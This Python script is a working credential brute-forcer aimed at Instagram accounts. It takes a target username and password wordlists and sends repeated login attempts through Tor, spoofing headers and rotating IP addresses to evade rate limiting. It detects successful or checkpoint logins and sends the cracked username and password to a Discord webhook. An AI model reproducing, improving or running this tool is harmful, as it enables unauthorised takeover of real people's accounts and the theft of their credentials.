# lib's here ! 
import os,subprocess
os.system('clear')
try:
    import requests
except ModuleNotFoundError:
    subprocess.check_output('pip3 install requests',shell=True)
    subprocess.check_output('pip install requests',shell=True)
try:
    import random
except ModuleNotFoundError:
    subprocess.check_output('pip3 install random',shell=True)
    subprocess.check_output('pip install random',shell=True)
try:
    from user_agent import generate_user_agent
except ModuleNotFoundError:
    subprocess.check_output('pip3 install user_agent',shell=True)
    subprocess.check_output('pip install user_agent',shell=True)
try:
    import colorama
    from colorama import Fore
except ModuleNotFoundError:
    subprocess.check_output('pip3 install colorama',shell=True)
    subprocess.check_output('pip install colorama',shell=True)

try:
    from time import sleep
except ModuleNotFoundError:

    subprocess.check_output('pip3 install time',shell=True)
    subprocess.check_output('pip install time',shell=True)
# important var's : 
url2 = 'https://httpbin.org/get'
colorama.init(autoreset=True)
red = Fore.RED
yellow = Fore.YELLOW
blue = Fore.BLUE
green = Fore.GREEN
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLACK
wh = Fore.WHITE
pur = "\033[35m"

if os.name == "nt":
    print("Sorry ! this tool is not for you ONLY LINUX USERS")
    exit(1)
# check For root <= ~ 
def Root():

    if os.geteuid() == 0:
        os.system('sudo service tor start')
        print('')
    else:
        print(f"""{pur}

        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⢚⢃⠴⢋⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣟⠇⠁⠀⣴⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣯⠟⠀⠐⠘⢿⣽⢿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠛⠁⠀⠄⢀⠐⡀⠉⠻⣯⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⠏⠀⡠⠀⠁⠀⠀⠂⢠⠀⠀⠈⢿⣿⣿⠃⠀⠀⠀⠀⠀⢀⣠⣼⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣷⡏⠀⠄⠀⠀⠀⠀⠐⡀⣸⠀⠀⠀⠈⣷⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠐⠀⠀⡀⠀⠀⣿⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⡄⠁⢀⠀⠀⠀⢸⠀⢹⠀⠀⠀⣸⣷⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣦⡁⠢⡀⠄⠘⣤⠇⠀⣠⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣷⣷⣾⣷⣾⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿
        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{reset}             /*   rembmer this tool only for Linux system   */
                        
           c o d e d by{red} A Z O{reset} | insta : {red}r7jhz1{reset} | github : {red}Az0122{reset}
        
        """)
        print('  ')
        print(f'please run as {red}root{reset} ! ')
        exit()
Root()

# check if tor installed <= ~ 
torr = os.path.exists('/usr/bin/tor')
if torr:
    pass
else:
    print(f'{red}installing  {pur}Tor{reset} . . .  ')
    os.system("sudo apt install tor -y > /dev/null ")


# banner for the tool <= ~ 
def ban():
    print(f"""{pur}

            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⢚⢃⠴⢋⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣟⠇⠁⠀⣴⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠛⢻⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣯⠟⠀⠐⠘⢿⣽⢿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠛⠁⠀⠄⢀⠐⡀⠉⠻⣯⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⠏⠀⡠⠀⠁⠀⠀⠂⢠⠀⠀⠈⢿⣿⣿⠃⠀⠀⠀⠀⠀⢀⣠⣼⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣷⡏⠀⠄⠀⠀⠀⠀⠐⡀⣸⠀⠀⠀⠈⣷⣿⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠐⠀⠀⡀⠀⠀⣿⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⡄⠁⢀⠀⠀⠀⢸⠀⢹⠀⠀⠀⣸⣷⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣦⡁⠢⡀⠄⠘⣤⠇⠀⣠⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣷⣷⣾⣷⣾⣿⣿⣿⣿⣿⣿⣦⣤⣤⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿
            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    {reset}             /*   rembmer this tool only for Linux system   */

              c o d e d by{red} A Z O{reset} |  insta : {red}r7jhz1{reset} | github : {red}Az0122{reset}
    
    """)


# First File to Brute Force <= ~ 
def pas():
    print(' ')
    global file
    
    file = input(f'{red}Password{reset} File without [{red}.txt{reset}] : ')
    

    try:

        file = open(f'{file}.txt',encoding="utf8", errors='ignore').read().splitlines()

    
    except FileNotFoundError:

    
        print(f'{yellow}[-] {file}.txt does not exist !')
    
        print('')

        print(f'[-] {red}Try{reset} again ! ')
    
        pas()
    
    if len(file)==0:
    
        print('')
    
        print(f'{red}[~] List is empty {reset} ')
    
        pas()

# second file to Brute Force <= ~

def pas1():

    
    print(' ')
    
    global file1
    
    file1 = str(input(f'{pur}another {red}password{reset} file without [{red}.txt{reset}] {red}Press{reset} Enter for {red}nothing{reset} : '))
    
    print(' ')
    
    if file1 == '':

    
        pass
    
    else:
    
        try:
    
            file1 = open(f'{file1}.txt', encoding="utf8", errors='ignore').read().splitlines()
    
        except FileNotFoundError:
    
            print(f'{yellow}[-] {file1}.txt does not exist !')
    
            print('')
    
            print(f'[-] {red}Try{reset} again ! ')
    
            pas1()
    
        if len(file1)==0:
    
            print('  ')
    
            print(f'{red}[~] List is empty {reset} ')
    
            pas1()

ban()
pas()
pas1()
os.system('clear')
ban() 
def usrr():
    global usr
    usr = str(input(f"Enter Your {red}target{reset} user : "))
    if len(usr) <= 2:
        print(' ')
        print(f'{yellow}incorrect Username {red}[!]{reset}')
        print(' ')
        usrr()
usrr()
print('')
if file1 == "":
    file0 = file
else:
    file0 = file + file1
a = 0
wb = input(f"Want To Use Webhook {blue}Discord{reset} ? : [{green}Y{reset}/{red}n{reset}] ")
if wb == 'Y' or wb == 'y':
    webhook = input('\nwebhook : ')
    webhook=webhook
while True:

    password = file0[a]
    a += 1     
       
    try:

        url = 'https://www.instagram.com/accounts/login/ajax/'
        ref = [
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://google.com/',
        'https://www.facebook.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.yahoo.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.instagram.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',
        'https://www.facebook.com/',

        ]
        asasas = random.choice(ref)
        
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=X0padwAEAAEPS5xI4RZu1YV6z7zS; rur=ASH; csrftoken=xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6; urlgen="{\"185.88.26.35\": 201031}:1kC1CG:D41DVXmf-j-T5nYho3c7g7K3MQU"',
            'content-length': '275',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': f'{asasas}',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': f'{generate_user_agent()}',
            'x-csrftoken': 'xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
            'x-instagram-ajax': '0c15f4d7d44a',
            'x-requested-with': 'XMLHttpRequest'
                   }

        proxy = {
            'http': 'socks5://localhost:9050',
            'https': 'socks5://localhost:9050',
        }
        data = {
            'username': f'{usr}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
                }
        
        
        req_login = requests.post(url, headers=headers, data=data, proxies=proxy)
        os.system('sudo service tor reload')
        sleep1 = random.randrange(7,17)   
        print(' ')
        print(f"{yellow}sleep is : {sleep1}")
        sleep(sleep1)
        print('  ')
        os.system('sudo service tor reload')
        req_login2 = requests.get(url2, proxies=proxy)
        print('  ')
        print(f'{yellow}Tor IP :',req_login2.json()['origin'])
        print(' ')
        os.system('sudo service tor reload')
        if ('"user":true,"userId"') in req_login.text:
           print(f'{green}the Connection under control : '+ req_login.text)
           print(f'{green}[+] user : ' + usr)
           print(f'{green}[+] password ! : ' + password)
           os.system('sudo service tor stop')
           try:

               inf = {'content': f"username : {usr} pass : {password}" }       
               requests.post(webhook,data=inf)
               break
           except:

            break
        elif ('"message":"","status":"fail"') in req_login.text:
            print (f'{yellow}wait a min . . . {reset}:{red} ' + req_login.text)
            sle = random.randrange(60,80)
            sleep(sle)   
            os.system('sudo service tor reload ')
            a -= 1
        elif ('"message":"Please wait a few minutes before you try again.","status":"fail"') in req_login.text:
           print (f'{red}wait a min . . . ' + req_login.text)
           os.system('sudo service tor reload') 
           slee = random.randrange(65,80)
           sleep(slee)   
           a -= 1
           os.system('sudo service tor reload ')
        elif ('"checkpoint_required","checkpoint_url"') in req_login.text:
           print(f'{green}[!] Secure')
           print(f'{green}[!] user:' + usr)
           print(f"{red}[!] password : {green}" + password)
           sleep(1)
           try:

               inf = {'content': f"username : {usr} pass : {password}" }       
               requests.post(webhook,data=inf)
               break
           except:

            break
        else:
           if ('"error":["Sorry, there was a problem with your request."') in req_login.text:
               print(f'{yellow}the Connection fail {reset}:{red} '+ req_login.text)
               print(' ')
               print(f'{yellow}wait a min . . . ')
               slqee = random.randrange(65,80)
               sleep(slqee)   
               a -= 1
           else:
              print(f'{green}the Connection under control : ' + req_login.text )
              print(f'{green}[-] username : ' + usr)
              print(f'{red}[-] password : ' + password)
              
    except requests.exceptions.ConnectionError:
         print(f'{red}[!] Bad proxy ~{reset}')
         os.system('sudo service tor restart')